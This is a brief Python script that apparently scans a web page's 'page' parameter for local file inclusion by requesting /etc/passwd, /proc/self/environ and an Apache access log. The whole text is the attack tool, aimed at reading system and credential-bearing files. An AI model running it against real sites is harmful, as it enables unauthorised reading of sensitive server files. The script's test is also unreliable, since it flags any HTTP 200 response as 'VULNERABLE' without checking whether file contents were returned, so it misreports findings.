import requests

# list of files to check for LFI vulnerability
files = ["/etc/passwd", "/proc/self/environ", "/var/log/apache2/access.log"]

# base URL to test
url = "http://example.com/index.php?page="

# loop through the list of files
for file in files:
    # construct the full URL to test
    test_url = url + file
    # make the request to the URL
    response = requests.get(test_url)
    # check the response status code
    if response.status_code == 200:
        # if the status code is 200, the file is accessible
        print(f"[+] VULNERABLE: {test_url}")
    else:
        # if the status code is not 200, the file is not accessible
        print(f"[-] Not VULNERABLE: {test_url}")
